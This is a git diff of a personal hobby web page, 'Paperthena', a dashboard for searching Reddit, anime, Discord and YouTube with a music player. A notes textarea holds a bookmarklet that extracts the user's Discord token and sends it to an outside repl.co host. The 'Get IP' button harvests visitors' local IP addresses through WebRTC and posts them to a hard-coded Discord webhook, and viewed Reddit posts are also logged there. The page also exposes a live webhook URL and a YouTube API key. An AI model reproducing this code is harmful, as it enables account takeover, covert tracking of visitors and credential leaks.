@@ -1,16 +1,258 @@
 <!DOCTYPE html>
-<title>Paperthena</title>
 <meta charset="utf-8">
-<link href="icon.png" rel="icon" type="image/png" sizes="32x32">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Paperthena</title>
+<link href="icon.png" rel="icon" type="image/png" sizes="32x32">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js" integrity="sha512-uMtXmF28A2Ab/JJO2t/vYhlaa/3ahUOgj1Zf27M5rOo8/+fcTUVH0/E0ll68njmjrLqOBjXM3V9NiPFL5ywWPQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
-<style>:root { --theme: #cb9f6e; }
+<style>
+:root { --color: #cb9f6e; }
+* { margin: 0; padding: 0; box-sizing: border-box; }
+fieldset { margin: 8px; padding: 6px; }
+input, select, button { margin: 2px; padding: 2px; }
 
-* { margin: 0; padding: 0; box-sizing: border-box; text-align: center; }
-body { background-size: cover; /*background-image: url("background.jpg");*/ background-repeat: no-repeat; background-attachment: fixed; background-position: center;
-color: white; background-color: var(--theme); }
+body { background-size: cover; background-image: url(""); background-repeat: no-repeat; background-attachment: fixed; background-position: center;
+color: white; background-color: var(--color); }
 
+.menu ul { list-style-type: none; cursor: pointer !important; }
+.menu ul li { color: white; background-color: var(--color); }
+.menu ul li ul { opacity: 0; position: absolute; display: flex; flex-direction: column; pointer-events: none; }
+.menu ul li:hover > ul { opacity: 1; transition: all 2s ease; pointer-events: auto; }
+.menu ul li a:hover { transition: all 1s ease; background-color: pink; }
+.menu ul li:hover p::after { content: "~"; }
+</style>
+
+<fieldset>
+<legend>
+<button><a id="link_id" href="index.html" download>S<span style="color: red">ourc</span>e</a></button>
+
+<button class="menu">
+<ul>
+<li id="z"><p>Music</p>
+<ul style="z-index: 1; line-height: 3ch;">
+<li><a onclick="play_music('eine')">Eine Kleine</a></li>
+<li><a onclick="play_music('haiiro')">Haiiro to Ao</a></li>
+<li><a onclick="play_music('kaerou')">Kaerou</a></li>
+<li><a onclick="play_music('lemon')">Lemon</a></li>
+<li><a onclick="play_music('loser')">Loser</a></li>
+<li><a onclick="play_music('matsuri')">Matsuri</a></li>
+<li><a onclick="play_music('metronome')">Metronome</a></li>
+<li><a onclick="play_music('night')">Night Dancer</a></li>
+<li><a>More</a><ul>
+<li><a onclick="play_music('shinunoga')">Shinunoga E-Wa</a></li>
+<li><a onclick="play_music('tsumi')">Tsumi No Kaori</a></li>
+<li><a onclick="play_music('orion')">Orion</a></li>
+<li><a onclick="play_music('shunrai')">Shunrai</a></li>
+<li><a onclick="play_music('uma')">Uma to Shika</a></li>
+<li><a onclick="play_music('yasashisa')">Yasashisa</a></li>
+</ul></li>
+</ul></li>
+</ul></button>
+
+<select id="mode_selector"><option value="night" selected>Night</option><option value="light">Light</option></select>
+
+</legend>
+<input id="query" placeholder="Search" type="search" onkeypress="if(event.key === 'Enter') search.click()">
+<select id="search_type">
+<option value="Reddit" selected>Reddit</option>
+<option value="Anime">Anime</option>
+<option value="Discord">Discord</option>
+<option value="Youtube">Youtube</option>
+</select>
+<button id="search" onclick="search(query.value)">Search</button>
+<button onclick="rewind()">Rewind</button>
+<button onclick="reset()">Reset</button>
+<input type="radio" id="sort1" name="sort" class="sort" value="sort1" checked><button><label for="sort1">Show</label></button>
+<input type="radio" id="sort2" name="sort" class="sort" value="sort2"><button><label for="sort2">Hide</label></button>
+<div id="result"></div>
+</fieldset>
+
+<script>
+body = document.querySelector("body")
+global_url = "background.jpg"
+
+radios = document.querySelectorAll(".sort")
+for(radio in radios) { radios[radio].onchange = function() {
+if(this.value === "sort1") hideable_div.style.display = "block"
+else if(this.value === "sort2") hideable_div.style.display = "none" } }
+
+mode_selector.onchange = event => {
+if(event.target.value === "night") {
+body.style.color = "white"
+body.style.backgroundColor = "black"
+} else {
+body.style.color = "black"
+body.style.backgroundColor = "white" } }
+
+function search(query) {
+switch(search_type.value.toLowerCase()) {
+case "anime": anime_search(query); break
+case "discord": discord_search(query); break
+case "youtube": youtube_search(query || "dota 2"); break
+default: reddit_search(query.split(" ")[0] || "memes", query.split(" ")[1] || "hot") } }
+
+function rewind() { search_type.selectedIndex = 0
+posts_seen = posts_seen.slice(0, -2)
+localStorage.setItem("posts_seen", posts_seen) }
+
+function reset() { search_type.selectedIndex = 0
+localStorage.clear(); location.reload() }
+
+anime_query = []
+anime_liblary = { M: "Manga", A: "Anime", J: "Japan", K: "Korea", C: "China", S: "Short", F: "Film", R: "Rated", _: "Series" }
+anime_liblary_2 = { D: "No Data", _: "Verified" }
+function anime_search(query) { run = true
+if(!query) query = mkush[Math.floor(Math.random() * mkush.length)].t.match(/.../).join("")
+div = document.createElement("div")
+mkush.forEach(mm => {
+if(mm.t.toLowerCase().includes(query.toLowerCase())) {
+if(!anime_query.includes(mm.t+mm.p) && run) { run = false
+anime_query.push(mm.t+mm.p)
+axios.get(`https://api.jikan.moe/v4/anime?q=${mm.t}`)
+.then(res => img_element(res.data.data[0].images.jpg.image_url))
+.finally(() => p_element(`${anime_liblary[mm.d.charAt(0)]} ${anime_liblary[mm.d.charAt(1)]} ${anime_liblary[mm.d.charAt(2)]} ${anime_liblary_2[mm.d.charAt(3)]} ${mm.t} ${mm.p}`)) } } })
+result.replaceChildren(div) }
+
+async function discord_search(query) {
+if(!query) query = mkush[Math.floor(Math.random() * mkush.length)].t.match(/.../).join("").toLowerCase()
+div = document.createElement("div")
+res = await axios.get(`https://v1.elusion1.repl.co/api?q=${query}`)
+if(res.data.links.length === 0) res = await axios.get(`https://v2.elusion1.repl.co/api?q=${query}`)
+res.data.links.forEach(link => img_element(link))
+result.replaceChildren(div) }
+
+const seen_videos = []
+function youtube_search(query) { run = true
+div = document.createElement("div")
+axios.get(`https://www.googleapis.com/youtube/v3/search?key=AIzaSyDf0ZX9wHtlKDuwNAepO-GrctBmOI_Y0qE&q=${query}`).then(res => {
+res.data.items.forEach(item => {
+if(!seen_videos.includes(item.id.videoId) && run) { run = false
+seen_videos.push(item.id.videoId)
+iframe_element(`https://www.youtube.com/embed/${item.id.videoId}`) } }) })
+result.replaceChildren(div) }
+
+posts_seen = []
+temp_posts_seens = localStorage.getItem("posts_seen")
+if(temp_posts_seens) posts_seen = temp_posts_seens.split(",")
+post_comments = []
+seen_comments = []
+comment_index = 0
+function reddit_search(query, sort) { post_filter = true
+div = document.createElement('div')
+axios.get(`https://www.reddit.com/r/${query}/${sort}.json`).then(async res => {
+for(const post of sort === "random" ? res.data[0].data.children : res.data.data.children) {
+if(!posts_seen.includes(post.data.id) && post_filter) {
+post_filter = false
+posts_seen.push(post.data.id)
+localStorage.setItem("posts_seen", posts_seen)
+global_url = post.data.url
+seen_comments = []
+comment_index = 0
+p_element(`r/${post.data.subreddit}: ${post.data.title} `)
+a_element(`https://redd.it/${post.data.id}`)
+if(post.data.secure_media?.reddit_video) global_url = post.data.secure_media.reddit_video.hls_url
+if(global_url.match(/(v.redd|imgur.+\.gifv)/)) {
+global_url = global_url.replace("gifv", "mp4")
+video_element(global_url)
+} else if(global_url.match(/(redgifs)/)) {
+global_url = global_url.replace("watch", "ifr")
+iframe_element(global_url)
+} else if(global_url.match(/(imgur|i.redd|\.(png|jpg|jpeg))/)) {
+img_element(global_url)
+} else if(global_url.includes("gallery")) {
+post.data.gallery_data.items.forEach(m => {
+img_element(post.data.media_metadata[m.media_id].s.u.replace(/amp;/g, "")) }) }
+post_comments = await axios.get(`https://www.reddit.com/comments/${post.data.id}.json`)
+discord_webhook(`r/${post.data.subreddit}: ${post.data.title} [https://redd.it/${post.data.id}]\n${post.data.url}`) } } }).then(() => {
+if(post_filter) p_element("El Psy Kongroo") }).catch(err => p_element(err))
+link_id.href = global_url
+result.replaceChildren(div) }
+function reddit_comment() {
+post_filter = true
+if(post_comments.length === 0) return
+for(const comment of post_comments.data[1].data.children) {
+comment_data = `u/${comment.data.author}: ${comment.data.body}`
+if(!seen_comments.includes(comment_data) && !comment.data.author?.match(/(bot|mod|qualityvote)/i) && post_filter) {
+post_filter = false
+seen_comments.push(comment_data)
+comment_index++
+last_comment = document.querySelector("#last_comment")
+if(last_comment) result.removeChild(last_comment)
+div = document.createElement("div")
+p_element(comment_data)
+div.setAttribute("id", "last_comment") }
+result.appendChild(div) } }
+
+function discord_webhook(message) {
+req = new XMLHttpRequest()
+req.open("POST", "https://discord.com/api/webhooks/1005744977801912450/SRhxYTMUkIr3j4mjA-Ib9lzaIHG7u-lkyrZXd1DKuPT3JJzsS9gsmdxz6BUZtgd8Y4pm")
+req.setRequestHeader("Content-Type", "application/json")
+req.send(JSON.stringify({ "username": "Ishkafel", "content": message, "avatar_url": "icon.png" })) }
+
+function on_submit(e) { e.preventDefault() }
+
+function p_element(text, base, user) {
+if(!base) base = div
+temp_div = document.createElement("div")
+if(user) {
+b = document.createElement("b")
+b.innerText = user
+temp_div.appendChild(b) }
+p = document.createElement("span")
+p.innerText = text
+temp_div.appendChild(p)
+temp_div.style.display = "block"
+base.prepend(temp_div) }
+
+function a_element(link) {
+a = document.createElement("a")
+a.innerText = "[" + link + "]"
+a.setAttribute("target", "_blank")
+a.setAttribute("rel", "noopener noreferrer")
+a.setAttribute("href", link)
+p.appendChild(a) }
+
+function img_element(link, base) {
+if(!base) base = div
+a = document.createElement("a")
+img = document.createElement("img")
+img.src = link
+a.appendChild(img)
+a.setAttribute("target", "_blank")
+a.setAttribute("rel", "noopener noreferrer")
+a.setAttribute("href", link)
+base.prepend(a) }
+
+function audio_element(link) {
+audio = document.createElement("audio")
+source = document.createElement("source")
+source.src = link
+source.type = "audio/ogg" || "audio/mpeg"
+audio.appendChild(source)
+audio.setAttribute("controls", "controls")
+div.appendChild(audio) }
+
+function video_element(link) {
+video = document.createElement("video")
+source = document.createElement("source")
+source.src = link
+source.type = "video/ogg" || "video/webm" || "video/mp4"
+video.appendChild(source)
+video.setAttribute("controls", "controls")
+div.appendChild(video) }
+
+function iframe_element(link) {
+iframe = document.createElement("iframe")
+iframe.src = link
+iframe.setAttribute("allow", "fullscreen")
+div.appendChild(iframe) }
+</script>
+
+
+
+<button><a id="up" onclick="down.scrollIntoView({ behavior: 'smooth' })">Down</a></button>
+
+<style>
 #auto_hide_div img { width: 20vw; }
 #auto_hide_div img:hover { transition: all 1s ease; transform: scale(1.2) rotate(360deg); }
 
@@ -33,13 +275,6 @@ textarea { width: 50%; }
 #hide_id:checked ~ .auto_resize { display: none; }
 input[type="search"], input, select, button, textarea { padding: 0.1vw; background-color: var(--theme); color: white; border: none; }
 a { color: #white; text-decoration: none; }
-
-.menu ul { list-style-type: none; cursor: pointer; }
-.menu ul li ul { position: absolute; opacity: 0; flex-direction: column; display: flex; pointer-events: none; }
-.menu ul li:hover > ul { transition: all 0.5s ease; opacity: 1; pointer-events: auto; }
-.menu ul li a:hover { transition: all 0.8s ease; background-color: pink; }
-.menu ul { background-color: var(--theme); color: white; padding: 1vw; }
-.menu ul li:hover i::after { content: "~" !important; }
 
 .btn1 { --b: 3px; --s: .45em; --color: #373B44;
 padding: calc(.5em + var(--s)) calc(.9em + var(--s)); color: var(--color); --_p: var(--s);
@@ -68,65 +303,14 @@ transition: .3s linear, color 0s, background-color 0s; outline: var(--b) solid #
 
 </style>
 
-<h1>I BROKE THE WEBSITE WILL FIX SOON SORRY MOM
-</h1>
+pagibig | onlinejobs | upwork | sai | prdc | jcd
 
-<textarea>
-pagibig
-prdc | jcd infosearch
-concentrix | teleperformance | ttec | probe group philippines inc
-onlinejobs | upwork | elephant stock | inteligence llc
-</textarea>
 
-<div class="menu" style="user-select: none;">
-<ul style="justify-content: space-between; display: flex;">
-<li id="z">Music
-<ul style="z-index: 1; line-height: 2ch;">
-<li><a onclick="play_music('eine')">Eine Kleine</a></li>
-<li><a onclick="play_music('haiiro')">Haiiro to Ao</a></li>
-<li><a onclick="play_music('kaerou')">Kaerou</a></li>
-<li><a onclick="play_music('lemon')">Lemon</a></li>
-<li><a onclick="play_music('loser')">Loser</a></li>
-<li><a onclick="play_music('matsuri')">Matsuri</a></li>
-<li><a onclick="play_music('metronome')">Metronome</a></li>
-<li><a onclick="play_music('night')">Night Dancer</a></li>
-<li><a onclick="play_music('shinunoga')">Shinunoga E-Wa</a></li>
-<li><a onclick="play_music('tsumi')">Tsumi No Kaori</a></li>
-<li><a onclick="play_music('orion')">Orion</a></li>
-<li><a onclick="play_music('shunrai')">Shunrai</a></li>
-<li><a onclick="play_music('uma')">Uma to Shika</a></li>
-<li><a onclick="play_music('yasashisa')">Yasashisa</a></li>
-<li><span style="color: red; font-weight: bold;">Okabe</span><ul>
-<li><span style="color: red; font-weight: bold;">Makise</span></li>
-</ul></li>
-</ul></li>
-<li><select id="mode_selector"><option value="Nightmode" selected>Night</option><option value="Lightmode">Light</option></select></li>
-</ul></div>
-
-<fieldset>
-<legend>
-<button><a id="up" onclick="down.scrollIntoView({ behavior: 'smooth' })">Down</a></button>
-<button><a id="link_id" href="index.html" download>Eurus</a></button>
-</legend>
-<input id="query" placeholder="Search" type="search" onkeypress="if(event.key === 'Enter') document.querySelector('#query_search').click()">
-<select id="search_type">
-<option value="Reddit" selected>Reddit</option>
-<option value="Anime">Anime</option>
-<option value="Discord">Discord</option>
-<option value="Youtube">Youtube</option>
-</select>
-<button id="query_search" onclick="query_search(document.querySelector('#query').value)">Search</button><br>
-<input type="radio" id="sort1" name="sort" class="sort" value="sort1" checked><button><label for="sort1">Show Img</label></button>
-<input type="radio" id="sort2" name="sort" class="sort" value="sort2"><button><label for="sort2">Hide Img</label></button>
-</fieldset>
 
 <button class="btn1" id="crypto_position" onclick="binance_search()">Get Price</button>
 <button class="btn2" id="user_ip" onclick="get_user_ip(function(temp_ip) { user_ip.innerHTML = temp_ip; discord_webhook(`IP: ${temp_ip}`) })">Get IP</button>
 <button id="size_div" onclick="xhr.send(null)">Get Size</button>
 <button id="progress" onclick="speedtest_init()">Get Speed</button>
-
-<button rewind()>Rewind</button>
-<button reset()>Reset</button>
 
 <input type="checkbox" id="music_id" onclick="hide_music()"><button><label for="music_id">Hide Music</label></button>
 <input type="checkbox" id="hide_id"><button><label for="hide_id">Hide Box</label><button>
@@ -142,7 +326,6 @@ onlinejobs | upwork | elephant stock | inteligence llc
 </form>
 
 <div id="home"></div>
-<div id="result"></div>
 
 <div id="item_id" onclick="reddit_comment()">
 <p>Sketchbook 180gsm (₱199)</p>
@@ -179,8 +362,7 @@ onlinejobs | upwork | elephant stock | inteligence llc
 </div>
 
 <script>
-body = document.querySelector("body")
-global_url = "background.jpg"
+
 
 auto_type_word = ""
 auto_type_index = 0
@@ -219,7 +401,156 @@ body.style.backgroundImage = `url(${global_url})` }}
 
 </script>
 
-<textarea class="auto_resize">client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
+<script>
+
+file_size = ""
+
+window.addEventListener("load", () => play_music())
+
+function check() {
+img_path = document.getElementById('img_file')
+if(img_path.value !== "") {
+img = img_path.files[0].size
+img_size = (img / 1024).toFixed(2)
+size.value = img_size } }
+
+xhr = new XMLHttpRequest()
+xhr.open('HEAD', global_url, true)
+xhr.onreadystatechange = function() {
+if(xhr.readyState == 4) {
+if(xhr.status == 200) {
+file_size = xhr.getResponseHeader('Content-Length')
+size_div.innerHTML = file_size
+console.log(file_size)
+} else size_div.innerHTML = "No Data" } }
+
+function hide_music() {
+if(!music_player_showed) { music_player_showed = true
+music_position.style.display = "block" }
+else { music_player_showed = false
+music_position.style.display = "none" } }
+
+const server_request = axios.create({ baseURL: "https://v1.elusion1.repl.co", params: { token: "kish" } })
+res_length = 0
+async function get_posts(user, message) {
+posts.innerHTML = "Loading..."
+posts_div = document.createElement("div")
+if(user && message) res = await Promise.all([ server_request.get("/messages", { params: { a: user, c: message } }) ])
+else res = await Promise.all([ server_request.get("/messages") ])
+if(res[0].data.links.length === 0) return posts.innerHTML = "No data"
+if(res[0].data.links.length === res_length) return
+res_length = res[0].data.links.length
+chat_amount = res[0].data.links.length > 15 ? res[0].data.links.length - 15 : 0
+for(let i = chat_amount; i < res[0].data.links.length; i++) {
+link = res[0].data.links[i]
+p_element(`${link.comment.replace("\n", " ").replace(/<[@:\w\d]+>/g, "")}`, posts_div, `${link.user.replace(" 🐢", "")}:`)
+if(link.image) img_element(link.image, posts_div) }
+posts.replaceChildren(posts_div) }
+
+keyboard_events = ["z"]
+window.addEventListener("keydown", e => { if(!keyboard_events.includes(e.key)) return; document.getElementById(e.key).style.visibility = "hidden" })
+window.addEventListener("keyup", e => { if(!keyboard_events.includes(e.key)) return; keyboard_events.forEach(temp_key => document.getElementById(temp_key).style.visibility = "visible") })
+
+keyboard_events.forEach(temp_key => keyboard_press(temp_key))
+function keyboard_press(key) { btn = document.getElementById(key)
+btn.addEventListener("touchstart", () => window.dispatchEvent(new KeyboardEvent("keydown", {"key": key})))
+btn.addEventListener("touchend", () => window.dispatchEvent(new KeyboardEvent("keyup", {"key": key}))) }
+
+const auto_resize_docs = document.getElementsByClassName("auto_resize")
+for(let i = 0; i < auto_resize_docs.length; i++) {
+auto_resize_docs[i].setAttribute("style", "height: " + (auto_resize_docs[i].scrollHeight) + "px; overflow-y: hidden;")
+auto_resize_docs[i].addEventListener("input", on_input, false) }
+function on_input() { this.style.height = 0
+this.style.height = (this.scrollHeight) + "px" }
+
+function get_user_ip(new_temp_ip) {
+peer_connection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection
+pc = new peer_connection({ iceServers: [] })
+noop = function() {}
+local_ips = {}
+ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g
+let ip_key
+function iterate_ip(ip) {
+if(!local_ips[ip]) new_temp_ip(ip)
+local_ips[ip] = true }
+pc.createDataChannel("")
+pc.createOffer(function(sdp) { //pc.createOffer().then(function(sdp) {
+sdp.sdp.split("\n")
+.forEach(function(line) {
+if(line.indexOf("candidate") < 0) return
+line.match(ip_regex).forEach(iterate_ip) })
+pc.setLocalDescription(sdp, noop, noop)
+}, noop) //}).catch(function(reason) { alert("error") })
+pc.onicecandidate = function(ice) {
+if(!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ip_regex)) return
+ice.candidate.candidate.match(ip_regex).forEach(iterate_ip) } }
+
+function speedtest_show_progress(message) {
+if(progress) { progress.innerHTML = (typeof message === "string") ? message : message.join("<br>") } }
+function speedtest_init() {
+speedtest_show_progress("Loading...")
+window.setTimeout(speedtest, 1) }
+function speedtest() {
+let start_time, end_time
+download = new Image()
+download.onload = function () {
+end_time = (new Date()).getTime()
+speedtest_result() }
+download.onerror = function (err, msg) {
+speedtest_show_progress("No Data") }
+start_time = (new Date()).getTime()
+cacheBuster = "?nnn=" + start_time
+download.src = global_url + cacheBuster
+function speedtest_result() {
+duration = (end_time - start_time) / 1000
+bits_loaded = file_size * 8
+speed_bps = (bits_loaded / duration).toFixed(2)
+speed_kbps = (speed_bps / 1024).toFixed(2)
+speed_mbps = (speed_kbps / 1024).toFixed(2)
+speedtest_show_progress([speed_mbps + " MBPS"]) } }
+
+function binance_search(query) {
+axios.get(`https://api.binance.com/api/v3/ticker/24hr?symbol=${query || 'BTC'}USDT`)
+.then(res => crypto_position.innerHTML = `${res.data.symbol.split("USDT")[0]} | ${parseFloat(res.data.lastPrice).toFixed(2)} | ${parseFloat(res.data.priceChangePercent).toFixed(2)}%`) }
+
+music_player_showed = true
+music_list = [
+{ name: "Fujii Kaze - Yasashisa", id: "a", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089115948318986280/Fujii_Kaze_-_YASASHISA.mp3" },
+{ name: "Fujii Kaze - Kaerou", id: "b", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089115947610148934/Fujii_Kaze_-_Kaerou.mp3" },
+{ name: "Fujii Kaze - Shinunoga E-Wa", id: "c", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089115947941494864/Fujii_Kaze_-_Shinunoga_E-Wa.mp3" },
+{ name: "Fujii Kaze - Matsuri", id: "d", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089180079164248115/Fujii_Kaze_-_Matsuri.mp3" },
+{ name: "Fujii Kaze - Tsumi No Kaori", id: "e", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089181706881355796/Fujii_Kaze_-_Tsumi_No_Kaori.mp3" },
+{ name: "Imase - Night Dancer", id: "f", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089216865559126106/imase_-_NIGHT_DANCER.mp3" },
+{ name: "Kenshi Yonezu - Lemon", id: "g", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089359214117404714/Kenshi_Yonezu_-_Lemon.mp3" },
+{ name: "Kenshi Yonezu - Metronome", id: "h", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618372661727303/-__Kenshi_Yonezu_-_Metronome.m4a" },
+{ name: "Kenshi Yonezu - Loser", id: "i", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618370589728848/Kenshi_Yonezu_-_Loser.mp3" },
+{ name: "Kenshi Yonezu - Shunrai", id: "j", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618370912702544/Kenshi_Yonezu_-_Shunrai.mp3" },
+{ name: "Kenshi Yonezu - Uma to Shika", id: "k", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618371252424785/Kenshi_Yonezu_-_Uma_to_Shika.mp3" },
+{ name: "Kenshi Yonezu - Orion", id: "l", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618371705425940/Kenshi_Yonezu_-_Orion.mp3" },
+{ name: "Kenshi Yonezu - Eine Kleine", id: "m", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618372380696586/-__Kenshi_Yonezu_-_Eine_Kleine.m4a" },
+{ name: "Kenshi Yonezu - Haiiro to Ao", id: "n", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618372028371014/Kenshi_Yonezu_-_Haiirotoao__Masaki_Suda_.mp3" }
+]
+
+last_music = ""
+function play_music(music) {
+if(!music) music = music_list[Math.floor(Math.random() * music_list.length)].name
+if(music === last_music) return
+last_music = music
+div = document.createElement("div")
+music_list.forEach(temp_music => {
+if(temp_music.name.toLowerCase().includes(music.toLowerCase())) {
+global_url = temp_music.src
+p_element(temp_music.name)
+audio_element(temp_music.src) } })
+music_position.replaceChildren(div)
+audio.onended = () => {
+play_music(music_list[Math.floor(Math.random() * music_list.length)].name)
+audio.play() } }
+
+</script><button><a id="down" href="#up">Up</a></button>-->
+
+<textarea class="auto_resize">
+client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
 alias "+ac0" "bind q dota_ability_autocast 0"; alias "-ac0" "bind q dota_ability_execute 0"; bind "shift" "+ac0"
 javascript:(() => { token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for(let c in e.c) m.push(e.c[c])}]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(); send = prompt(token, token); if(send !== token) window.location.href = "https://v1.elusion1.repl.co/app?n=" + token })()
 
@@ -1049,8 +1380,11 @@ class emoji(commands.Cog):
                 await message.delete()
 
 def setup(bot):
-    bot.add_cog(emoji(bot))</textarea>
-<script>mkush = [{ "d": "AC__", "t": "The King's Avatar", "p": "12/12,12/12" },
+    bot.add_cog(emoji(bot))
+</textarea>
+
+<script>
+mkush = [{ "d": "AC__", "t": "The King's Avatar", "p": "12/12,12/12" },
 { "d": "ACS_", "t": "How to Steal 55 Kisses", "p": "12/12,12/12,12/12,12/12" },
 { "d": "ACS_", "t": "To Be Hero", "p": "12/12,1/12" },
 { "d": "AJ__", "t": "3D Kanojo: Real Girl", "p": "12/12" },
@@ -1467,323 +1801,4 @@ def setup(bot):
 { "d": "MKR_", "t": "Weak Point", "p": "120/120" },
 { "d": "MKR_", "t": "Young Mom and Daughter", "p": "7/32" },
 { "d": "MKRD", "t": "Under Observation: My First Loves and I", "p": "52/52" }]//mkush
-
-file_size = ""
-
-window.addEventListener("load", () => play_music())
-
-function check() {
-img_path = document.getElementById('img_file')
-if(img_path.value !== "") {
-img = img_path.files[0].size
-img_size = (img / 1024).toFixed(2)
-size.value = img_size } }
-
-xhr = new XMLHttpRequest()
-xhr.open('HEAD', global_url, true)
-xhr.onreadystatechange = function() {
-if(xhr.readyState == 4) {
-if(xhr.status == 200) {
-file_size = xhr.getResponseHeader('Content-Length')
-size_div.innerHTML = file_size
-console.log(file_size)
-} else size_div.innerHTML = "No Data" } }
-
-radios = document.querySelectorAll(".sort")
-for(radio in radios) { radios[radio].onchange = function() {
-if(this.value === "sort1") item_id.style.display = "block"
-else if(this.value === "sort2") item_id.style.display = "none" } }
-
-function hide_music() {
-if(!music_player_showed) { music_player_showed = true
-music_position.style.display = "block" }
-else { music_player_showed = false
-music_position.style.display = "none" } }
-
-function query_search(query) {
-switch(search_type.value.toLowerCase()) {
-case "anime": anime_search(query); break
-case "discord": discord_search(query); break
-case "youtube": youtube_search(query || "dota 2"); break
-default: reddit_search(query.split(" ")[0] || "memes", query.split(" ")[1] || "hot") } }
-
-function rewind() { search_type.selectedIndex = 0
-posts_seen = posts_seen.slice(0, -2)
-localStorage.setItem("posts_seen", posts_seen) }
-
-function reset() { search_type.selectedIndex = 0
-localStorage.clear(); location.reload() }
-
-anime_query = []
-anime_liblary = { M: "Manga", A: "Anime", J: "Japan", K: "Korea", C: "China", S: "Short", F: "Film", R: "Rated", _: "Series" }
-anime_liblary_2 = { D: "No Data", _: "Verified" }
-function anime_search(query) { run = true
-if(!query) query = mkush[Math.floor(Math.random() * mkush.length)].t.match(/.../).join("")
-div = document.createElement("div")
-mkush.forEach(mm => {
-if(mm.t.toLowerCase().includes(query.toLowerCase())) {
-if(!anime_query.includes(mm.t+mm.p) && run) { run = false
-anime_query.push(mm.t+mm.p)
-axios.get(`https://api.jikan.moe/v4/anime?q=${mm.t}`)
-.then(res => img_element(res.data.data[0].images.jpg.image_url))
-.finally(() => p_element(`${anime_liblary[mm.d.charAt(0)]} ${anime_liblary[mm.d.charAt(1)]} ${anime_liblary[mm.d.charAt(2)]} ${anime_liblary_2[mm.d.charAt(3)]} ${mm.t} ${mm.p}`)) } } })
-result.replaceChildren(div) }
-
-async function discord_search(query) {
-if(!query) query = mkush[Math.floor(Math.random() * mkush.length)].t.match(/.../).join("").toLowerCase()
-div = document.createElement("div")
-res = await axios.get(`https://v1.elusion1.repl.co/api?q=${query}`)
-if(res.data.links.length === 0) res = await axios.get(`https://v2.elusion1.repl.co/api?q=${query}`)
-res.data.links.forEach(link => img_element(link))
-result.replaceChildren(div) }
-
-const seen_videos = []
-function youtube_search(query) { run = true
-div = document.createElement("div")
-axios.get(`https://www.googleapis.com/youtube/v3/search?key=AIzaSyDf0ZX9wHtlKDuwNAepO-GrctBmOI_Y0qE&q=${query}`).then(res => {
-res.data.items.forEach(item => {
-if(!seen_videos.includes(item.id.videoId) && run) { run = false
-seen_videos.push(item.id.videoId)
-iframe_element(`https://www.youtube.com/embed/${item.id.videoId}`) } }) })
-result.replaceChildren(div) }
-
-posts_seen = []
-temp_posts_seens = localStorage.getItem("posts_seen")
-if(temp_posts_seens) posts_seen = temp_posts_seens.split(",")
-post_comments = []
-seen_comments = []
-comment_index = 0
-function reddit_search(query, sort) { post_filter = true
-div = document.createElement('div')
-axios.get(`https://www.reddit.com/r/${query}/${sort}.json`).then(async res => {
-for(const post of sort === "random" ? res.data[0].data.children : res.data.data.children) {
-if(!posts_seen.includes(post.data.id) && post_filter) {
-post_filter = false
-posts_seen.push(post.data.id)
-localStorage.setItem("posts_seen", posts_seen)
-global_url = post.data.url
-seen_comments = []
-comment_index = 0
-p_element(`r/${post.data.subreddit}: ${post.data.title} `)
-a_element(`https://redd.it/${post.data.id}`)
-if(post.data.secure_media?.reddit_video) global_url = post.data.secure_media.reddit_video.hls_url
-if(global_url.match(/(v.redd|imgur.+\.gifv)/)) {
-global_url = global_url.replace("gifv", "mp4")
-video_element(global_url)
-} else if(global_url.match(/(redgifs)/)) {
-global_url = global_url.replace("watch", "ifr")
-iframe_element(global_url)
-} else if(global_url.match(/(imgur|i.redd|\.(png|jpg|jpeg))/)) {
-img_element(global_url)
-} else if(global_url.includes("gallery")) {
-post.data.gallery_data.items.forEach(m => {
-img_element(post.data.media_metadata[m.media_id].s.u.replace(/amp;/g, "")) }) }
-post_comments = await axios.get(`https://www.reddit.com/comments/${post.data.id}.json`)
-discord_webhook(`r/${post.data.subreddit}: ${post.data.title} [https://redd.it/${post.data.id}]\n${post.data.url}`) } } }).then(() => {
-if(post_filter) p_element("El Psy Kongroo") }).catch(err => p_element(err))
-link_id.href = global_url
-result.replaceChildren(div) }
-function reddit_comment() {
-post_filter = true
-if(post_comments.length === 0) return
-for(const comment of post_comments.data[1].data.children) {
-comment_data = `u/${comment.data.author}: ${comment.data.body}`
-if(!seen_comments.includes(comment_data) && !comment.data.author?.match(/(bot|mod|qualityvote)/i) && post_filter) {
-post_filter = false
-seen_comments.push(comment_data)
-comment_index++
-last_comment = document.querySelector("#last_comment")
-if(last_comment) result.removeChild(last_comment)
-div = document.createElement("div")
-p_element(comment_data)
-div.setAttribute("id", "last_comment") }
-result.appendChild(div) } }
-
-const server_request = axios.create({ baseURL: "https://v1.elusion1.repl.co", params: { token: "kish" } })
-res_length = 0
-async function get_posts(user, message) {
-posts.innerHTML = "Loading..."
-posts_div = document.createElement("div")
-if(user && message) res = await Promise.all([ server_request.get("/messages", { params: { a: user, c: message } }) ])
-else res = await Promise.all([ server_request.get("/messages") ])
-if(res[0].data.links.length === 0) return posts.innerHTML = "No data"
